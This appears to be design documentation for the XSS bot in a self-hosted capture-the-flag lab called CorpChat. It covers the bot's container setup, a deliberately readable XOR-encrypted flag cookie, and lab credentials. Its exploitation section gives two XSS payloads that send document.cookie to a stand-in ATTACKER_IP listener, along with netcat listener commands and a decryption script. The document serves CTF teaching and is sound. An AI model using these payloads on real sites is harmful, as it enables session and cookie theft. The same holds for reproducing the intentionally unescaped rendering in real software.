# XSS Bot

[Back to Index](README.md)

---

## Overview

The XSS bot is a second Docker container that runs alongside the CorpChat application. It simulates a real user browsing the platform: it logs in, visits every DM conversation it has access to, and waits 60 seconds before repeating. Its browser session carries an encrypted flag cookie that can be stolen via Cross-Site Scripting if an attacker sends it a malicious DM.

The bot is built on **Puppeteer** (Node.js) driving a headless **Chromium** browser. This makes it a realistic XSS target: the browser executes real JavaScript, honours cookies, and follows redirects exactly as a real browser would.

---

## Files

| File | Purpose |
|------|---------|
| `bot/bot.js` | Main bot script — login, cookie setup, DM polling loop |
| `bot/dockerfile` | Node.js 18 + Chromium image |
| `bot/package.json` | Dependencies (`puppeteer`) |
| `docker/docker-compose.yml` | Wires the bot to the corpchat service |

---

## Container Image (`bot/dockerfile`)

```dockerfile
FROM node:18-slim

ENV PUPPETEER_SKIP_DOWNLOAD=true
ENV CHROMIUM_PATH=/usr/bin/chromium

WORKDIR /app

RUN apt-get update && apt-get install -y --no-install-recommends \
    chromium \
    fonts-liberation \
    libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 \
    libxcomposite1 libxdamage1 libxrandr2 \
    libgbm1 libgtk-3-0 libasound2 \
    && rm -rf /var/lib/apt/lists/*

COPY package*.json ./
RUN npm install

COPY bot.js .

CMD ["node", "bot.js"]
```

**Key design decisions:**

- `PUPPETEER_SKIP_DOWNLOAD=true` — Puppeteer normally downloads its own Chromium during `npm install`. This is disabled so the system-installed `chromium` package is used instead (avoids downloading a second Chromium binary inside the container).
- `CHROMIUM_PATH=/usr/bin/chromium` — Points Puppeteer to the system Chromium.
- The `--no-sandbox` flag is required because the container runs as root and Chromium's sandbox does not work in that context.

---

## Environment Variables

All bot behaviour is configurable via environment variables. The `docker-compose.yml` sets the defaults for a development run:

| Variable | Default | Description |
|----------|---------|-------------|
| `TARGET_URL` | `http://localhost:8080` | URL of the CorpChat application |
| `BOT_USER` | `compliancebot` | Username the bot logs in as |
| `BOT_PASS` | `ufoundit` | Password for the bot account |
| `DEBUG_TOKEN` | `b3b46de0-86e1-4a98-885d-1a85d2bef561` | The raw debug API token placed in the flag cookie |
| `POLL_MS` | `60000` | Milliseconds between DM poll cycles (default: 60 seconds) |
| `CHROMIUM_PATH` | `/usr/bin/chromium` | Path to the Chromium executable |

---

## Startup Sequence

```
1. waitForApp()
   └── Polls TARGET_URL/login every 3 seconds until the app responds
       (handles the race condition between the two containers starting)

2. puppeteer.launch({ headless: true, executablePath: EXEC_PATH })
   └── Starts headless Chromium in --no-sandbox mode

3. page.goto('/login') → fill #username, #password → click submit
   └── Bot is now authenticated as compliancebot

4. page.setCookie('flag', encryptToken(DEBUG_TOKEN), httpOnly=false)
   page.setCookie('hint', 'This looks encrypted...', httpOnly=false)
   └── Initial cookies set in the browser's cookie jar

5. Infinite poll loop (every POLL_MS):
   a. Re-encrypt flag cookie (refresh for current hour's XOR key)
   b. goto('/dm') → collect all a.dm-item hrefs
   c. For each DM link: goto(link) → sleep 2s → next
```

---

## The Flag Cookie

### What It Is

The flag cookie contains the debug API token (`b3b46de0-86e1-4a98-885d-1a85d2bef561`) encrypted with a single-byte XOR key. The raw token, if passed in an `X-API-Token` header, grants the holder full API access as the bot account (`compliancebot`).

### The Encryption Scheme

```javascript
function encryptToken(token) {
  const keyByte = Math.floor(Date.now() / 3_600_000) & 0xFF;
  const buf = Buffer.from(token, 'utf8');
  const enc = Buffer.from(buf.map(b => b ^ keyByte));
  return 'CORP{' + enc.toString('base64') + '}';
}
```

Step-by-step:

1. `Math.floor(Date.now() / 3_600_000)` — divide the current Unix timestamp in milliseconds by 3,600,000 (one hour in ms) and floor it. This gives the number of complete hours since the Unix epoch. **The value changes once per hour.**
2. `& 0xFF` — keep only the lowest 8 bits. The key is always a single byte (0–255).
3. XOR each byte of the token with this key byte.
4. Base64-encode the result.
5. Wrap in `CORP{...}` so players recognise it as a CorpChat ciphertext.

### Cookie Properties

```javascript
{ name: 'flag',  value: 'CORP{...}', httpOnly: false }
{ name: 'hint',  value: 'This looks encrypted. Maybe the platform has a crypto endpoint you could use...', httpOnly: false }
```

Both cookies are `httpOnly: false` — **JavaScript running in the page can read them via `document.cookie`**. This is the deliberate XSS vulnerability: if you inject JavaScript into a DM that the bot visits, your payload can exfiltrate the flag cookie.

### Why It Rotates

The XOR key changes every hour. The bot re-encrypts the cookie at the top of each poll cycle. This means:

- The cookie value you steal reflects the key at the moment the bot last visited.
- You must decrypt it quickly (within the same hour) or re-exploit XSS to get a fresh value.
- The `/api/v1/crypto/encrypt` endpoint uses the **same hourly key**, so you can use it to determine the current key.

---

## The Hint Cookie

```
hint = "This looks encrypted. Maybe the platform has a crypto endpoint you could use..."
```

This points players to `POST /api/v1/crypto/encrypt`, which exposes the same XOR cipher server-side. Players can use it as a **chosen-plaintext oracle**:

1. Encrypt a known plaintext of all zeros (or any known string).
2. XOR the ciphertext bytes with the known plaintext bytes to recover the key byte.
3. XOR the flag cookie bytes (after base64-decoding) with the key byte to recover the raw token.

```python
import base64, requests

# Encrypt 36 zero bytes (same length as the UUID token)
resp = requests.post(
    'http://<ip>:8080/api/v1/crypto/encrypt',
    headers={'X-API-Token': '<any-valid-token>'},
    json={'plaintext': '\x00' * 36}
)
ciphertext_b64 = resp.json()['data']['ciphertext']
# Strip CORP{...}
ciphertext = base64.b64decode(ciphertext_b64[5:-1])

# XOR with known plaintext (all zeros) recovers the key byte
# Since 0 XOR key = key:
key_byte = ciphertext[0]  # same for all positions since key is single byte

# Now decrypt the flag cookie
cookie_val = 'CORP{...}'   # value stolen from bot's browser
cookie_bytes = base64.b64decode(cookie_val[5:-1])
raw_token = bytes(b ^ key_byte for b in cookie_bytes).decode()
print(f"Debug token: {raw_token}")
```

---

## XSS Exploitation

### Why the DM Renderer is Vulnerable

The DM template renders message content using Jinja2's `| safe` filter (or equivalent unsafe rendering), which disables HTML auto-escaping. Any HTML or JavaScript in a message body is injected directly into the page's DOM.

### Sending a Malicious DM to the Bot

Log in as any user and start a DM conversation with `compliancebot`. Send a message containing a JavaScript payload:

```html
<script>
fetch('http://ATTACKER_IP:8888/?c=' + encodeURIComponent(document.cookie));
</script>
```

Or a more subtle version that doesn't modify the DOM:

```html
<img src=x onerror="new Image().src='http://ATTACKER_IP:8888/?c='+encodeURIComponent(document.cookie)">
```

### Setting Up the Listener

```bash
# Simple Python HTTP server
python3 -m http.server 8888

# Or netcat
nc -lvnp 8888
```

### What You Receive

When the bot visits the DM (within 60 seconds), Chromium executes the payload. Your listener receives a request like:

```
GET /?c=flag=CORP%7BHjAqNz...%7D; hint=This%20looks%20encrypted... HTTP/1.1
```

URL-decode and parse the `flag` value, then use the crypto oracle to decrypt it.

### Full Exploit Flow

```
You ──DM payload──► compliancebot's DM inbox
         │
         ▼ (within 60 seconds)
    Bot visits /dm → collects links → visits your DM
         │
         ▼
    Chromium executes <script>fetch(document.cookie)</script>
         │
         ▼
    Your listener receives: flag=CORP{<base64 XOR token>}
         │
         ▼
    Decrypt via /api/v1/crypto/encrypt (chosen-plaintext)
         │
         ▼
    Raw debug token: b3b46de0-86e1-4a98-885d-1a85d2bef561
         │
         ▼
    Use as X-API-Token to access API as compliancebot
```

---

## Docker Compose Integration

```yaml
services:
  corpchat:
    build:
      context: ..
      dockerfile: docker/Dockerfile
    image: pwnbox-ctf
    container_name: corpchat-dev
    ports:
      - "80:80"
      - "2222:22"
    volumes:
      - corpchat_data:/data
    environment:
      - FLASK_CONFIG=config.ProductionConfig
      - SECRET_KEY=corpchat-dev-secret
    restart: unless-stopped

  xss-bot:
    build:
      context: ../bot
      dockerfile: dockerfile
    container_name: xss-bot
    depends_on:
      - corpchat
    environment:
      - TARGET_URL=http://corpchat:8080   ← uses Docker service name, not localhost
      - BOT_USER=compliancebot
      - BOT_PASS=ufoundit
      - DEBUG_TOKEN=b3b46de0-86e1-4a98-885d-1a85d2bef561
      - POLL_MS=60000
      - CHROMIUM_PATH=/usr/bin/chromium
    restart: unless-stopped
```

Key points:

- `depends_on: corpchat` — Docker Compose starts the `corpchat` service before the bot. However `depends_on` only waits for the container to start, not for the Flask app inside it to be ready. The bot handles this with `waitForApp()`, which polls `/login` until it gets a 200.
- `TARGET_URL=http://corpchat:8080` — The bot uses the Docker service name (`corpchat`) as the hostname, which resolves to the corpchat container's IP on the shared Docker network. This is the standard Docker Compose internal DNS.
- The two containers share a Docker network (created by Compose). The `corpchat` container's ports are also exposed to the host (`80:80`, `2222:22`), but the bot uses the internal network.

---

## Logs

Follow bot activity:

```bash
docker compose logs -f xss-bot
```

Example output:

```
[*] Waiting for app to start...
[*] Waiting for app to start...
[*] App is up
[*] Logged in as compliancebot
[*] Flag cookie set (encrypted debug token)
[*] Found 1 DM conversation(s)
[*] Visiting http://corpchat:8080/dm/conversation/1
[*] Sleeping 60s...
[*] Found 2 DM conversation(s)
[*] Visiting http://corpchat:8080/dm/conversation/1
[*] Visiting http://corpchat:8080/dm/conversation/2
[*] Sleeping 60s...
```

A new DM conversation appears when a player sends `compliancebot` a message. Watch for new conversations to confirm XSS delivery.

---

## Security Notes

The bot uses `--no-sandbox` for Chromium. In a production XSS testing environment this would be a security concern, but here it is acceptable because:

1. The container is isolated by Docker networking.
2. The only attacker payload is a CTF flag exfiltration — not a real attack.
3. The bot runs in a dedicated container separate from the application.

Never use `--no-sandbox` in a production browser automation context.
